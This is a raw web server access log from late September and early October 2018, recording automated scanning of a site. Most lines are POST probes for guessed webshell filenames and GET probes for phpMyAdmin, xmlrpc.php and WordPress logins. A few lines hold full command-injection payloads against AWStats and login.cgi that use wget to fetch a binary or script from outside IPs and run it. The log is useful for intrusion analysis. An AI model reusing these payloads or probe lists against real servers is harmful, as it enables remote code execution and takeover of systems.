"190.102.146.26","30/Sep/2018","POST","/mz.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xx.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/yumo.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/min.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/wan.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/wanan.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ssaa.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qq.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/aw.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/12.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/hh.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ak.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ip.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/infoo.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qq.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qwe.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/1213.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/post.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/h1.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/test.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/3.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/phpinfi.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/aaaa.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/9510.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/python.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/default.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/sean.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/app.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/help.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/tiandi.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/miao.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xz.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/linuxse.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/zuoindex.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/zshmindex.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/tomcat.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ceshi.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/1hou.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ou2.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/zuoss.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/boots.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/she.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/s.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qw.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/test.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/caonma.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ss.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/wcp.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/uuu.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/sss.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/1.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/2.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/core.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qaz.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/sha.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ppx.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/1.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/confg.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/conf1g.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ver.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/hack.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qa.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/Ss.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xxx.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/92.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/z.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/x.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/nuoxi.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/godkey.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/okokok.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/erwa.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/pma.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ruyi.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/51314.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/5201314.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/fusheng.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/general.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/repeat.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ldw.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/api.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/s1.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xiaodai.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/hello.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xp.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/1.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/2.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/p.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/1.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/a.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/m.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/conf.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/123.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/HX.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xiaoma.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xiaomae.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xiaomar.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qq.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/data.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/log.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/fack.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/angge.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","GET","/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/pmd/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/pma/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/PMA/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/PMA2/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/pmamy/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/pmamy2/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/mysql/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/admin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/db/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/dbadmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/web/phpMyAdmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/admin/pma/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/admin/PMA/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/admin/mysql/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/admin/mysql2/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/admin/phpmyadmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/admin/phpMyAdmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/admin/phpmyadmin2/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/mysqladmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/mysql-admin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpadmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpAdmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin0/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin1/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin2/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin-4.4.0/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/myadmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/myadmin2/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/xampp/phpmyadmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyadmin_bak/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/www/phpMyAdmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/tools/phpMyAdmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin-old/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdminold/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin.old/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/pma-old/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/claroline/phpMyAdmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/typo3/phpmyadmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpma/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin/phpmyadmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin/phpMyAdmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAbmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin__/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin+++---/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/v/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpmyadm1n/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdm1n/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/shaAdmin/index.php","Safari/537.36"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmion/index.php","Safari/537.36"

"96.68.165.185","30/Sep/2018","GET","/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|",""-"

"96.68.165.185","30/Sep/2018","GET","/cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|",""-"

"96.68.165.185","30/Sep/2018","GET","/cgi-bin/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|",""-"

"96.68.165.185","30/Sep/2018","POST","/xmlrpc.php",""-"

"96.68.165.185","30/Sep/2018","POST","/blog/xmlrpc.php",""-"

"96.68.165.185","30/Sep/2018","POST","/blog/xmlsrv/xmlrpc.php",""-"

"96.68.165.185","30/Sep/2018","POST","/blogs/xmlsrv/xmlrpc.php",""-"

"96.68.165.185","30/Sep/2018","POST","/drupal/xmlrpc.php",""-"

"96.68.165.185","30/Sep/2018","POST","/phpgroupware/xmlrpc.php",""-"

"96.68.165.185","30/Sep/2018","POST","/wordpress/xmlrpc.php",""-"

"96.68.165.185","30/Sep/2018","POST","/xmlrpc.php",""-"

"96.68.165.185","30/Sep/2018","POST","/xmlrpc/xmlrpc.php",""-"

"96.68.165.185","30/Sep/2018","POST","/xmlsrv/xmlrpc.php",""-"

"184.154.139.4","30/Sep/2018","GET","/","Trident/6.0)"

"184.154.139.4","30/Sep/2018","GET","/","Trident/6.0)"

"184.154.139.4","30/Sep/2018","GET","/th1s_1s_a_4o4.html","Trident/6.0)"

"184.154.139.4","30/Sep/2018","GET","/index.html",";Nav)"

"184.154.139.4","30/Sep/2018","GET","/index.html","Trident/6.0)"

"42.236.102.23","30/Sep/2018","GET","/","360Spider"

"107.6.171.134","30/Sep/2018","GET","/","Safari/537.36"

"66.249.70.9","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"104.168.136.126","30/Sep/2018","GET","/ashx/globalHandler.ashx","Safari/537.36"

"66.249.64.131","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"185.74.236.229","30/Sep/2018","GET","/","Safari/601.7.7"

"141.8.143.176","30/Sep/2018","GET","/robots.txt","+http://yandex.com/bots)"

"141.8.144.26","30/Sep/2018","GET","/","+http://yandex.com/bots)"

"186.208.111.135","30/Sep/2018","GET","/","Safari/537.36"

"104.196.25.243","30/Sep/2018","GET","/",""-"

"18.217.128.129","30/Sep/2018","GET","/","Safari/537.36"

"66.249.70.19","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"66.249.70.24","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"212.83.142.211","30/Sep/2018","GET","/",""-"

"54.183.8.230","30/Sep/2018","OPTIONS","/","Safari/537.36"

"122.248.248.126","30/Sep/2018","GET","/status?full","Firefox/57.0"

"122.248.248.126","30/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/57.0"

"122.248.248.126","30/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/57.0"

"122.248.248.126","30/Sep/2018","GET","/_phpMyAdmin/scripts/setup.php","Firefox/57.0"

"122.248.248.126","30/Sep/2018","GET","/admin/scripts/setup.php","Firefox/57.0"

"122.248.248.126","30/Sep/2018","GET","/scripts/setup.php","Firefox/57.0"

"122.248.248.126","30/Sep/2018","GET","/pma/scripts/setup.php","Firefox/57.0"

"66.249.64.200","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"140.143.157.138","30/Sep/2018","GET","/status?full","Firefox/57.0"

"140.143.157.138","30/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/57.0"

"140.143.157.138","30/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/57.0"

"140.143.157.138","30/Sep/2018","GET","/_phpMyAdmin/scripts/setup.php","Firefox/57.0"

"140.143.157.138","30/Sep/2018","GET","/admin/scripts/setup.php","Firefox/57.0"

"140.143.157.138","30/Sep/2018","GET","/scripts/setup.php","Firefox/57.0"

"140.143.157.138","30/Sep/2018","GET","/pma/scripts/setup.php","Firefox/57.0"

"188.26.99.247","30/Sep/2018","GET","/","Safari/537.36"

"208.80.194.32","30/Sep/2018","GET","/Jogos/app/tutorial.pdf","Trident/4.0)"

"47.93.18.24","30/Sep/2018","GET","/","Safari/537.36"

"104.196.25.243","30/Sep/2018","GET","/",""-"

"34.241.180.166","30/Sep/2018","GET","/","aiohttp/2.3.2"

"66.249.70.10","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"66.249.70.7","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.70.9","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"35.231.160.28","30/Sep/2018","GET","/","Gecko/20030624"

"35.231.160.28","30/Sep/2018","GET","/","Gecko/20030624"

"35.229.34.249","30/Sep/2018","GET","/","Gecko/20030624"

"35.229.34.249","30/Sep/2018","GET","/","Gecko/20030624"

"218.103.195.221","30/Sep/2018","GET","/",""-"

"107.6.183.226","01/Oct/2018","GET","/","Safari/537.36"

"54.169.80.147","01/Oct/2018","GET","/status?full","Firefox/57.0"

"54.169.80.147","01/Oct/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/57.0"

"54.169.80.147","01/Oct/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/57.0"

"54.169.80.147","01/Oct/2018","GET","/_phpMyAdmin/scripts/setup.php","Firefox/57.0"

"54.169.80.147","01/Oct/2018","GET","/admin/scripts/setup.php","Firefox/57.0"

"54.169.80.147","01/Oct/2018","GET","/scripts/setup.php","Firefox/57.0"

"54.169.80.147","01/Oct/2018","GET","/pma/scripts/setup.php","Firefox/57.0"

"172.104.108.109","01/Oct/2018","GET","/",""Mozilla/5.0"

"185.12.69.203","01/Oct/2018","GET","/","Safari/537.36"

"119.29.130.253","01/Oct/2018","GET","/status?full","Firefox/57.0"

"119.29.130.253","01/Oct/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/57.0"

"119.29.130.253","01/Oct/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/57.0"

"104.168.136.126","01/Oct/2018","GET","/ashx/globalHandler.ashx","Safari/537.36"

"102.253.80.8","01/Oct/2018","GET","/","Safari/537.36"

"61.122.211.102","01/Oct/2018","GET","/login.cgi?cli=aa%20aa%27;wget%20http://212.237.32.62/k%20-O%20-%3E%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$",""LMAO/2.0"

"45.227.255.221","01/Oct/2018","GET","/",""Mozilla/5.0"

"189.79.84.236","01/Oct/2018","GET","/","Safari/537.36"

"185.234.217.192","01/Oct/2018","GET","/wp-login.php","Trident/5.0)"

"185.234.217.192","01/Oct/2018","GET","//wp-login.php","Trident/5.0)"

"180.76.15.144","01/Oct/2018","GET","/","+http://www.baidu.com/search/spider.html)"

"62.105.17.246","01/Oct/2018","GET","/",""-"

"93.155.151.41","01/Oct/2018","GET","/",""-"

"169.50.140.20","01/Oct/2018","GET","/",""-"

"207.136.239.67","01/Oct/2018","GET","/","Safari/537.36"

"94.191.25.26","01/Oct/2018","PROPFIND","/",""-"

"94.191.25.26","01/Oct/2018","GET","/webdav/",""Mozilla/5.0"

"94.191.25.26","01/Oct/2018","GET","/help.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/java.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/_query.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/test.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/db_cts.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/db_pma.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/logon.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/help-e.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/license.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/log.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/hell.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/pmd_online.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/x.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/shell.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/htdocs.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/desktop.ini.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/z.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/lala.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/lala-dpr.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/wpo.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/text.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/wp-config.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/muhstik.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/muhstik2.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/muhstiks.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/muhstik-dpr.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/lol.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/uploader.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/cmd.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/cmx.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/cmv.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/cmdd.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/knal.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/cmd.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/shell.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/appserv.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/scripts/setup.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/phpmyadmin/scripts/setup.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdmin/scripts/setup.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/phpmyadmin/scripts/db___.init.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdmin/scripts/db___.init.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/plugins/weathermap/editor.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","GET","/cacti/plugins/weathermap/editor.php","Safari/537.36"

"94.191.25.26","01/Oct/2018","POST","/wuwu11.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xw.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xw1.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/9678.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/wc.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xx.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/s.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/w.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/sheep.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qaq.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/db.init.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/db_session.init.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/db__.init.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/wp-admins.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/m.php?pbid=open","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/db_dataml.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/db_desql.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/mx.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/wshell.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xshell.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qq.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/conflg.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/lindex.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/phpstudy.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/phpStudy.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/weixiao.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/feixiang.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ak47.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ak48.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xiao.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/yao.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/defect.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/webslee.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/q.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/pe.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/hm.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/cainiao.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/zuoshou.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/zuo.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/aotu.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/cmd.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/bak.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/system.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/l6.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/l7.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/l8.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/q.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/56.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/mz.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xx.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/yumo.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/min.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/wan.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/wanan.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ssaa.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qq.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/aw.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/12.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/hh.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ak.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ip.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/infoo.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qq.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qwe.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/1213.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/post.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/h1.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/test.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/3.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/phpinfi.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/aaaa.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/9510.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/python.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/default.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/sean.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/app.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/help.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/tiandi.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/miao.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xz.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/linuxse.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/zuoindex.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/zshmindex.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/tomcat.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ceshi.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/1hou.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ou2.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/zuos.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/zuoss.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/boots.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/she.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/s.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qw.php","Trident/6.0)"

